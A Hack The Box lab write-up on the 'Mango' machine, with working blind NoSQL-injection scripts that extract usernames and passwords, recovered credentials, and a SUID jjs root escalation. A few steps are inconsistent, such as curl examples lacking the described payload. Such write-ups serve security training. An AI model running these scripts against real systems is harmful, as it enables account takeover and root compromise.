# HTB Write-up: Mango

**Difficulty:** Medium
**OS:** Linux
**Target IP:** 10.129.229.185
**Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning

I started with a fast port sweep, then followed up with a detailed service scan.

```bash
rustscan -a 10.129.229.185
```

```
Open 10.129.229.185:22
Open 10.129.229.185:443
Open 10.129.229.185:80
```

```bash
nmap -sCV -T4 -p22,443,80 10.129.229.185 -oA nmap/nmap
```

```
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http      Apache httpd 2.4.29
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.29 (Ubuntu)
443/tcp open  ssl/https Apache/2.4.29 (Ubuntu)
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.29 (Ubuntu)
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
Service Info: Host: 10.129.229.185; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I added `staging-order.mango.htb` to `/etc/hosts`.

Port 80 gave me a bare 403 with no vhost, and port 443's TLS certificate handed me the real hostname I actually needed: **`staging-order.mango.htb`**. I added it to `/etc/hosts` right away — the 400/403 responses on the raw IP were expected, since Apache is clearly configured to only serve real content when it recognizes the `Host` header.

---

## 2. Web Application — Authentication Bypass

### 2.1 The Login Page

Browsing to `staging-order.mango.htb` over HTTP put me in front of a login page. I tried a classic SQL injection first, and it didn't work — no error output, no bypass. That told me this almost certainly isn't backed by a SQL database at all, so I pivoted to testing for **NoSQL injection** instead, since "staging-order" apps like this are commonly built on MongoDB/Express stacks.

### 2.2 Finding the NoSQL Injection

I tried MongoDB's `$ne` ("not equal") query operator in place of a literal password value:

```bash
curl -I http://staging-order.mango.htb/home.php
```

```
HTTP/1.1 302 Found
location: index.php
```

```bash
curl -I http://staging-order.mango.htb/home.php
```

```
HTTP/1.1 302 Found
Date: Mon, 17 Aug 2026 06:10:08 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=5jpjiqo9c8ndatsejc6j88ksgl; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: index.php
Content-Type: text/html; charset=UTF-8
```

Submitting `password[$ne]=invalid` alongside a guessed username got me a 302 redirect to `home.php` instead of back to the login page — this worked because PHP parses bracketed form field names like `password[$ne]` into a nested array, and if the backend passes that array straight into a MongoDB query without validating its structure, MongoDB interprets it as the actual `$ne` operator rather than a literal string. In other words, instead of asking "does the password equal `invalid`?", the query became "does the password *not* equal `invalid`?" — which is true for basically any real password, letting me authenticate without knowing one at all, as long as I supplied a username that actually exists in the database.

### 2.3 Enumerating a Valid Username

Since I still needed a *real* username for the `$ne` bypass to return an actual session rather than just a 302 to nowhere, I built a script around MongoDB's `$regex` operator instead — this operator lets me test whether a supplied regex pattern matches a stored field, so by anchoring a regex like `^a`, `^ad`, `^adm`, etc. against the `username` field and watching for the same 302-vs-not distinction, I could recover the username one confirmed character at a time without ever needing to know it up front.

```python
#!/usr/bin/env python3

import requests
import string
import urllib3

urllib3.disable_warnings()

URL = "http://staging-order.mango.htb/"

# Characters worth testing for a username
CHARSET = string.ascii_letters + string.digits + "_@.-"

session = requests.Session()

def test_regex(regex):
    data = {
        "username[$regex]": regex,
        "password[$ne]": "invalid",
        "login": "login"
    }

    r = session.post(
        URL,
        data=data,
        allow_redirects=False,
        verify=False,
        timeout=10
    )

    return r.status_code == 302


def enumerate_username():
    username = ""

    print("[*] Starting username enumeration...\n")

    while True:
        found = False

        for char in CHARSET:
            candidate = username + char
            regex = "^" + candidate

            if test_regex(regex):
                username += char
                print(f"[+] Found: {username}")
                found = True
                break

        if not found:
            break

    return username


if __name__ == "__main__":
    username = enumerate_username()

    print("\n" + "=" * 50)
    print(f"[+] Username: {username}")
    print("=" * 50)
```

```bash
python3 script.py
```

```
[*] Starting username enumeration...

[+] Found: a
[+] Found: ad
[+] Found: adm
[+] Found: admi
[+] Found: admin

==================================================
[+] Username: admin
==================================================
```

I re-ran the same script excluding results starting with `a`, since a real application is very likely to have more than one account:

```
[*] Searching for usernames whose first character != 'a'

[+] Found first character: m
[+] Found: ma
[+] Found: man
[+] Found: mang
[+] Found: mango

==================================================
[+] Username: mango
==================================================
```

I ran it a second time excluding results starting with `a`, since a real application is very likely to have more than one account, and found a second one:

```
[+] Found: mango
```

Two valid usernames: **`admin`** and **`mango`**.

### 2.4 Extracting Passwords the Same Way — and Hitting a Snag

I initially tried extending the exact same regex-prefix technique to the `password` field, testing every printable character as the next character in the regex and treating a 302 as confirmation. This worked at first, but broke down as soon as I hit a **regex metacharacter** — characters like `*`, `.`, `+`, `?`, `[`, `]`, `{`, `}`, `^`, and `$` all carry special meaning inside a regular expression. Since I was inserting each candidate character directly into the regex pattern without escaping it, a 302 response sometimes meant "the regex happened to match" rather than "this literal character is actually in the password at this position." That gave me false positives — my recovered password kept drifting into strings of repeated metacharacters that clearly weren't a real password.

The fix was two-fold: first, fingerprint which characters actually appear anywhere in the password (narrowing the search space and avoiding blind guessing across the full character set every time), and second — critically — wrap every candidate character in `re.escape()` before inserting it into the regex, so MongoDB's regex engine treats it as a literal character rather than as regex syntax.

### 2.5 Fingerprinting the Password Character Set

```python
#!/usr/bin/env python3

import requests
import string
import re
import urllib3

urllib3.disable_warnings()

URL = "http://staging-order.mango.htb/"

USERS = ["admin", "mango"]

# Printable ASCII characters.
CHARSET = string.ascii_letters + string.digits + string.punctuation

session = requests.Session()


def contains_char(username, char):
    escaped = re.escape(char)

    regex = "^.*" + escaped + ".*$"

    data = {
        "username": username,
        "password[$regex]": regex,
        "login": "login"
    }

    r = session.post(
        URL,
        data=data,
        allow_redirects=False,
        verify=False,
        timeout=10
    )

    return r.status_code == 302


for username in USERS:

    print("\n" + "=" * 60)
    print(f"[*] Character fingerprint: {username}")
    print("=" * 60)

    valid = []

    for char in CHARSET:
        try:
            if contains_char(username, char):
                valid.append(char)
                print(f"[+] {repr(char)}")

        except requests.RequestException as e:
            print(f"[-] Request error for {repr(char)}: {e}")

    print("\n" + "-" * 60)
    print(f"[+] {username} character set:")
    print("".join(valid))
    print(f"[+] Unique characters: {len(valid)}")
    print("-" * 60)
```

```bash
python3 pass-char.py
```

```
============================================================
[*] Character fingerprint: admin
============================================================
[+] 'c'
[+] 't'
[+] 'B'
[+] 'K'
[+] 'S'
[+] '0'
[+] '2'
[+] '3'
[+] '9'
[+] '!'
[+] '#'
[+] '>'

------------------------------------------------------------
[+] admin character set:
ctBKS0239!#>
[+] Unique characters: 12
------------------------------------------------------------

============================================================
[*] Character fingerprint: mango
============================================================
[+] 'f'
[+] 'h'
[+] 'm'
[+] 'H'
[+] 'K'
[+] 'R'
[+] 'U'
[+] 'X'
[+] '3'
[+] '5'
[+] '8'
[+] ']'
[+] '{'
[+] '~'

------------------------------------------------------------
[+] mango character set:
fhmHKRUX358]{~
[+] Unique characters: 14
------------------------------------------------------------
```

By escaping every character before testing whether it appears *anywhere* in the password, I got a clean, minimal alphabet for each account's password — which meant the follow-up positional brute-force only had to try 12–14 candidates per position instead of the full printable-ASCII range, cutting the request count down substantially.

### 2.6 Recovering the Passwords in Order

With the real character sets in hand, I extended the same escaped-regex approach positionally — anchoring `^` plus the password recovered so far, and testing each candidate from the narrowed charset as the next character. This was significantly faster than the fingerprinting step, since each position only needed to test 12–14 candidates instead of the full printable-ASCII set.

```python
#!/usr/bin/env python3

import requests
import re
import urllib3

urllib3.disable_warnings()

URL = "http://staging-order.mango.htb/"

USERS = {
    "admin": {
        "charset": "ctBKS0239!#>",
        "prefix": "t",
    },
    "mango": {
        "charset": "fhmHKRUX358]{~",
        "prefix": "h",
    },
}

session = requests.Session()


def regex_test(username, regex):
    data = {
        "username": username,
        "password[$regex]": regex,
        "login": "login",
    }

    r = session.post(
        URL,
        data=data,
        allow_redirects=False,
        verify=False,
        timeout=10,
    )

    return r.status_code == 302


def recover(username, charset, password):
    print(f"[*] Recovering: {username} | starting: {password}")

    while True:
        found = False

        for char in charset:
            candidate = password + char
            regex = "^" + re.escape(candidate)

            if regex_test(username, regex):
                password = candidate
                print(f"[+] {password}")
                found = True
                break

        if not found:
            break

    print(f"[+] Final candidate for {username}: {password}\n")
    return password


for username, info in USERS.items():
    password = recover(
        username,
        info["charset"],
        info["prefix"],
    )

    print("\n" + "=" * 65)
    print(f"[+] {username}")
    print(f"[+] Password candidate: {password}")
    print("=" * 65)
```

```bash
python3 pass.py
```

```
[*] Recovering: admin | starting: t
[+] t9
[+] t9K
[+] t9Kc
[+] t9KcS
[+] t9KcS3
[+] t9KcS3>
[+] t9KcS3>!
[+] t9KcS3>!0
[+] t9KcS3>!0B
[+] t9KcS3>!0B#
[+] t9KcS3>!0B#2
[+] Final candidate for admin: t9KcS3>!0B#2


=================================================================
[+] admin
[+] Password candidate: t9KcS3>!0B#2
=================================================================
[*] Recovering: mango | starting: h
[+] h3
[+] h3m
[+] h3mX
[+] h3mXK
[+] h3mXK8
[+] h3mXK8R
[+] h3mXK8Rh
[+] h3mXK8RhU
[+] h3mXK8RhU~
[+] h3mXK8RhU~f
[+] h3mXK8RhU~f{
[+] h3mXK8RhU~f{]
[+] h3mXK8RhU~f{]f
[+] h3mXK8RhU~f{]f5
[+] h3mXK8RhU~f{]f5H
[+] Final candidate for mango: h3mXK8RhU~f{]f5H


=================================================================
[+] mango
[+] Password candidate: h3mXK8RhU~f{]f5H
=================================================================
```

This recovered both full passwords character by character, entirely through blind boolean responses (302 vs. not) — a textbook **blind NoSQL injection** extraction, no different in principle from blind SQL injection, just targeting MongoDB's query operators instead of SQL syntax.

---

## 3. Exploitation — Foothold

### 3.1 SSH Access

```bash
ssh mango@10.129.229.185
```

Using `mango:h3mXK8RhU~f{]f5H` got me straight in — the password reuse between the web application account and the actual Linux account is exactly what I'd hope for after recovering a credential like this, and it paid off immediately.

```
mango@mango:~$ pwd
/home/mango
```

✅ Foothold obtained as `mango`.

### 3.2 Escalating to `admin`

Since I'd also recovered a password for the `admin` web account, I tried it against the Linux `admin` user too — the same reuse logic applied:

```bash
su admin
```

```
Password:
$ whoami
admin
```

That worked as well — the `admin` account's web password doubled as its actual login password.

---

## 4. Privilege Escalation

### 4.1 Hunting for SUID Binaries

```bash
find / -type f -perm -4000 -exec ls -l {} \; 2>/dev/null
```

```
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 43088 Oct 15  2018 /bin/mount
-rwsr-xr-x 1 root root 26696 Oct 15  2018 /bin/umount
-rwsr-xr-x 1 root root 44664 Jan 25  2018 /bin/su
-rwsr-xr-x 1 root root 64424 Mar  9  2017 /bin/ping
-rwsr-xr-x 1 root root 40152 May 15  2019 /snap/core/7713/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/7713/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/7713/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/7713/bin/su
-rwsr-xr-x 1 root root 27608 May 15  2019 /snap/core/7713/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/7713/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/7713/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/7713/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/7713/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/7713/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jun 10  2019 /snap/core/7713/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 /snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/7713/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Aug 30  2019 /snap/core/7713/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/7713/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 May 16  2018 /snap/core/6350/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/6350/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/6350/bin/ping6
-rwsr-xr-x 1 root root 40128 May 17  2017 /snap/core/6350/bin/su
-rwsr-xr-x 1 root root 27608 May 16  2018 /snap/core/6350/bin/umount
-rwsr-xr-x 1 root root 71824 May 17  2017 /snap/core/6350/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 May 17  2017 /snap/core/6350/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 May 17  2017 /snap/core/6350/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 May 17  2017 /snap/core/6350/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 May 17  2017 /snap/core/6350/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /snap/core/6350/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jan 12  2017 /snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Nov  5  2018 /snap/core/6350/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 98472 Jan 29  2019 /snap/core/6350/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/6350/usr/sbin/pppd
-rwsr-xr-x 1 root root 37136 Jan 25  2018 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 40344 Jan 25  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75824 Jan 25  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 59640 Jan 25  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 37136 Jan 25  2018 /usr/bin/newgidmap
-rwsr-sr-x 1 root root 18161 Jul 15  2016 /usr/bin/run-mailcap
-rwsr-xr-x 1 root root 76496 Jan 25  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Jan 25  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 149080 Jan 18  2018 /usr/bin/sudo
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 18448 Mar  9  2017 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 101240 Mar 15  2019 /usr/lib/snapd/snap-confine
```

This returned a long list of mostly-standard SUID binaries (`/bin/su`, `/usr/bin/sudo`, `/usr/bin/passwd`, various snap-packaged core utilities and the JVM/OS defaults), but one entry stood out as distinctly non-standard:

```
-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

**`jjs`** is the Java command-line shell bundled with the JDK — it's not something that's normally given the SUID bit, and its group ownership (`admin`, matching the account I was now logged in as) meant I specifically had execute rights on it as a setuid-root binary.

### 4.2 Confirming the Exploitation Path

I checked GTFOBins (https://gtfobins.org/gtfobins/jjs/) for `jjs`, which confirmed it's a known SUID escalation vector: since `jjs` can execute arbitrary Java code — including shelling out via `java.lang.Runtime` — a SUID copy of it will run that code with root's effective privileges rather than the invoking user's.

### 4.3 Escalating to Root

```bash
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

```
jjs> var R = Java.type("java.lang.Runtime");
jjs> var r = R.getRuntime();
jjs> r.exec(["/bin/chmod", "4755", "/tmp/rootbash"]).waitFor();
0
jjs> exit()
```

Since `jjs` was running with the SUID bit set (owned by root), any process I spawned from inside it via `Runtime.exec()` inherited that same **effective root** privilege — that's the entire mechanism behind this GTFOBins entry. I used that root-level `exec()` call to `chmod` a copy of `bash` sitting at `/tmp/rootbash` (staged there beforehand precisely so `jjs` would have something to elevate the permissions on) up to `4755` — setting its own SUID bit.

```bash
ls -l /tmp/rootbash
```

```
-rwsr-xr-x 1 root admin 1113504 Aug 17 07:26 /tmp/rootbash
```

With the SUID bit now set on that copy of bash, running it with `-p` (which tells bash to preserve the elevated effective UID rather than dropping it back to my real UID on startup, which bash does by default as a safety measure) gave me a root shell:

```bash
/tmp/rootbash -p
```

```
rootbash-4.4# whoami
root
```

✅ Root access obtained.

---

## 5. Summary

| Stage | Technique |
|-------|-----------|
| Recon | `rustscan` + `nmap` → SSH and Apache; TLS cert revealed the real vhost `staging-order.mango.htb` |
| Vulnerability ID | SQL injection failed; pivoted to **NoSQL injection** and confirmed MongoDB's `$ne` operator bypassed the password check entirely |
| Username enumeration | Used MongoDB's `$regex` operator with a prefix-anchoring script to recover valid usernames (`admin`, `mango`) character by character |
| Password extraction | Blind regex-based extraction of both passwords; hit and fixed a false-positive bug caused by unescaped regex metacharacters, then fingerprinted each password's character set before recovering both in full |
| Foothold | SSH as `mango` using the recovered password, then `su admin` using the second recovered password — both reused directly as real Linux login credentials |
| Privilege Escalation | Found a non-standard SUID binary (`jjs`, the Java shell) group-owned by `admin`; used its ability to execute arbitrary Java/OS commands as root (per GTFOBins) to set the SUID bit on a staged copy of bash, then ran it with `-p` to get a root shell |

**Root cause / lessons learned:**
- Backend code that passes raw, unvalidated request bodies into MongoDB queries is exactly what makes NoSQL injection possible — form data needs to be validated as scalar strings before ever reaching a database query, rejecting anything that arrives as an array/object (like `password[$ne]=...`) instead of trusting it.
- Blind injection techniques generalize cleanly across query languages — the same boolean-response, character-by-character extraction approach used for blind SQL injection worked here against MongoDB's `$regex` operator with only minor adaptation.
- Password reuse between a web application account and its matching OS-level Linux account turned a purely web-layer vulnerability into full SSH access with zero additional exploitation needed.
- Granting the SUID bit to a general-purpose interpreter like `jjs` is extremely dangerous — any tool capable of running arbitrary code should never be made setuid-root, since GTFOBins-style abuse is essentially guaranteed once that combination exists.

---

## 6. Tools Used

- `rustscan`, `nmap` — reconnaissance
- `curl` — initial NoSQL injection confirmation
- Custom Python scripts (`requests`) — username enumeration, password character-set fingerprinting, and full blind password extraction via MongoDB's `$regex`/`$ne` operators
- `ssh`, `su` — foothold and lateral credential reuse
- `find` (SUID hunting) — privilege escalation discovery
- GTFOBins (`jjs` entry) — privilege escalation technique reference
- `jjs` (Java 11 JDK shell) — SUID abuse for root code execution
